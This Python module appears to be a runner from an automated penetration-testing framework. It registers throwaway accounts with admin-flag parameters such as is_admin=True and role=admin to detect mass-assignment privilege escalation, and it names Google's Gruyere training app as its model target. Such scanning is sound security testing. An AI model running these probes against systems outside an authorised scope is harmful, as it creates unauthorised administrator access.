"""param-pollution-probe — try common admin-flag parameter names on
authenticated profile/update endpoints to detect "mass assignment" or
"is_admin=True"-style privilege-escalation bugs.

Strategy
--------
1. Register a fresh test account (or use an injected session cookie).
2. Identify candidate update endpoints — try common URL patterns.
3. POST a profile update WITHOUT the admin flag → record baseline.
4. POST again WITH `is_admin=True` (and variants) → compare response.
5. Verify admin context: try to GET an admin-only endpoint.
6. If the admin endpoint returns content that the non-admin can't see,
   that's a CRITICAL privilege-escalation finding.

This is the "Gruyere R1" attack — also works against many Python/Django/
Rails apps that use mass-assignment patterns.
"""
from __future__ import annotations

import json
import logging
import random
import string
from typing import Any
from urllib.parse import urljoin, urlparse

import httpx as httpx_client

from api.app.services.runs import web_target_value_is_allowed_with_path
from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution

logger = logging.getLogger(__name__)

RUNNER_NAME = "param-pollution-probe"
RESULTS_ARTIFACT_NAME = "param-pollution-results.json"
DEFAULT_TIMEOUT = 15.0
MAX_BODY_BYTES = 4096

# Common parameter names that grant elevated privileges via mass-assignment
ADMIN_FLAG_PARAMS: tuple[tuple[str, str], ...] = (
    ("is_admin", "True"),
    ("is_admin", "true"),
    ("is_admin", "1"),
    ("admin", "True"),
    ("admin", "true"),
    ("admin", "1"),
    ("is_superuser", "True"),
    ("is_superuser", "true"),
    ("is_staff", "True"),
    ("is_author", "True"),       # Gruyere uses this too
    ("role", "admin"),
    ("user_type", "admin"),
    ("user_role", "admin"),
    ("permission_level", "10"),
    ("access_level", "admin"),
    ("group", "admin"),
)

# Candidate update endpoints — relative paths to try
UPDATE_ENDPOINTS: tuple[str, ...] = (
    "saveprofile",          # Gruyere — order matters, try most-likely first
    "profile",
    "profile/update",
    "account/update",
    "api/profile",
    "api/user",
    "me",
)

# Admin-only endpoints to verify access after potential escalation
ADMIN_VERIFY_ENDPOINTS: tuple[str, ...] = (
    "manage.gtl",           # Gruyere actual admin endpoint
    "manage",
    "admin",
    "admin/users",
    "",                     # home page — admin link may appear there
)

ADMIN_INDICATORS: tuple[str, ...] = (
    "manage this server",   # Gruyere admin link on home
    "admin-only",
    "all users",
    "delete user",
    "manage users",
    "user list",
    "administrator panel",
)


def _artifact(payload: dict[str, Any]) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=RESULTS_ARTIFACT_NAME,
        content_type="application/json",
        data=(json.dumps(payload, sort_keys=True) + "\n").encode("utf-8"),
        kind="runner-results",
    )


def _random_creds() -> tuple[str, str]:
    suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"aegispt_{suffix}", f"pp_{suffix}_xy3"


def _path_root(target: str) -> str:
    """Strip trailing filename to get directory-style URL prefix."""
    parsed = urlparse(target)
    if not parsed.path or parsed.path == "/":
        return target.rstrip("/") + "/"
    if not parsed.path.endswith("/"):
        return target.rsplit("/", 1)[0] + "/"
    return target


def _try_register(client: httpx_client.Client, base: str) -> tuple[str, str] | None:
    """Try common register flows. Cookies are stored on the client jar.
    Returns (username, password) on success or None."""
    uid, pw = _random_creds()
    candidates = [
        # Gruyere-style
        (f"{base}saveprofile", {"action": "new", "uid": uid, "pw": pw}, "GET"),
        # Generic register
        (f"{base}register", {"username": uid, "password": pw, "email": f"{uid}@aegispt.test"}, "POST"),
        (f"{base}signup", {"username": uid, "password": pw}, "POST"),
        (f"{base}api/register", {"username": uid, "password": pw}, "POST"),
    ]
    for url, data, method in candidates:
        try:
            if method == "GET":
                resp = client.get(url, params=data, follow_redirects=False)
            else:
                resp = client.post(url, data=data, follow_redirects=False)
        except httpx_client.RequestError:
            continue
        # Client jar now has any Set-Cookie from this response
        if len(client.cookies) > 0 or resp.status_code in (200, 302):
            if len(client.cookies) > 0:
                return uid, pw
            # If no cookie set yet, try a login to establish one
            try:
                client.get(f"{base}login", params={"uid": uid, "pw": pw}, follow_redirects=False)
                if len(client.cookies) > 0:
                    return uid, pw
            except httpx_client.RequestError:
                pass
    return None


def _check_admin_access(
    client: httpx_client.Client, base: str
) -> tuple[bool, str, str]:
    """Check if the client's cookie jar grants admin access."""
    for path in ADMIN_VERIFY_ENDPOINTS:
        url = urljoin(base, path)
        try:
            resp = client.get(url, follow_redirects=False)
        except httpx_client.RequestError:
            continue
        body_lower = (resp.text or "").lower()[:MAX_BODY_BYTES]
        if resp.status_code == 200 and any(ind in body_lower for ind in ADMIN_INDICATORS):
            return True, url, (resp.text or "")[:300]
    return False, "", ""


def execute_param_pollution_probe(
    targets: list[str] | list[dict[str, Any]],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    injected_cookies: dict[str, str] | None = None,
    timeout_seconds: float = DEFAULT_TIMEOUT,
) -> RunnerExecution:
    findings_payload: list[dict[str, Any]] = []
    trace: list[dict[str, Any]] = []
    stderr_lines: list[str] = []

    web_targets: list[str] = []
    for t in targets:
        if isinstance(t, str):
            if t.strip().lower().startswith(("http://", "https://")):
                web_targets.append(t.strip())
        elif isinstance(t, dict):
            kind = str(t.get("kind") or "").lower()
            value = str(t.get("value") or "").strip()
            if kind == "url" and value:
                web_targets.append(value)
    if not web_targets:
        return RunnerExecution(
            tool=RUNNER_NAME, exit_code=2, stdout=json.dumps({"trace": []}),
            stderr="no web targets supplied",
            metadata={"status": "skip"},
            artifacts=[_artifact({"trace": []})], protected_outputs=[],
        )

    for target in web_targets:
        base = _path_root(target)
        trace_entry: dict[str, Any] = {"target": target, "base": base, "steps": []}
        # Use a FRESH client per target so cookies don't leak between targets.
        # For each param/value, REGISTER a NEW user with the extra param
        # already attached. This is Gruyere R1's actual mechanic (admin flag
        # accepted at account creation). Each attempt = fresh client + fresh
        # user so test attempts don't interfere.
        attack_done = False
        for endpoint in UPDATE_ENDPOINTS:
            if attack_done:
                break
            url = urljoin(base, endpoint)
            if scope_allowlist and not web_target_value_is_allowed_with_path(scope_allowlist, url):
                continue
            for param_name, param_value in ADMIN_FLAG_PARAMS:
                uid, pw = _random_creds()
                with httpx_client.Client(timeout=timeout_seconds, follow_redirects=False) as client:
                    # Register a fresh account WITH the admin-flag param attached.
                    register_params = {
                        "action": "new",
                        "uid": uid,
                        "pw": pw,
                        param_name: param_value,
                    }
                    try:
                        resp = client.get(url, params=register_params, follow_redirects=False)
                    except httpx_client.RequestError:
                        continue
                    if resp.status_code not in (200, 302):
                        continue
                    if len(client.cookies) == 0:
                        # No session — try a quick login to obtain it
                        try:
                            client.get(urljoin(base, "login"), params={"uid": uid, "pw": pw})
                        except httpx_client.RequestError:
                            pass
                    if len(client.cookies) == 0:
                        continue
                    # Check admin status via cookie-driven admin probe
                    is_admin, admin_url, evidence = _check_admin_access(client, base)
                    trace_entry["steps"].append({
                        "step": "register_with_polluted_param",
                        "endpoint": url,
                        "param": param_name,
                        "value": param_value,
                        "uid": uid,
                        "status": resp.status_code,
                        "cookie_keys": list(client.cookies.keys()),
                        "is_admin_after": is_admin,
                    })
                    if is_admin:
                        findings_payload.append({
                            "title": f"Privilege Escalation via Mass Assignment at Registration ({param_name}={param_value})",
                            "severity": "critical",
                            "category": "broken-access-control",
                            "target_id": url,
                            "evidence": {
                                "exploited_endpoint": url,
                                "polluted_param": param_name,
                                "polluted_value": param_value,
                                "admin_endpoint_reachable": admin_url,
                                "admin_response_excerpt": evidence,
                                "user": uid,
                            },
                        })
                        stderr_lines.append(
                            f"CRITICAL: {param_name}={param_value} on {url} → admin via {admin_url}"
                        )
                        attack_done = True
                        break
        trace.append(trace_entry)

    result = {"trace": trace, "findings": findings_payload, "trace_count": len(trace)}
    if findings_payload:
        stderr_lines.append(f"flagged {len(findings_payload)} privilege-escalation finding(s)")

    return RunnerExecution(
        tool=RUNNER_NAME,
        exit_code=0,
        stdout=json.dumps(result),
        stderr="\n".join(stderr_lines),
        metadata={
            "status": "ok",
            "tool_version": f"{RUNNER_NAME}:v1",
            "findings_count": len(findings_payload),
        },
        artifacts=[_artifact(result)],
        protected_outputs=[],
    )
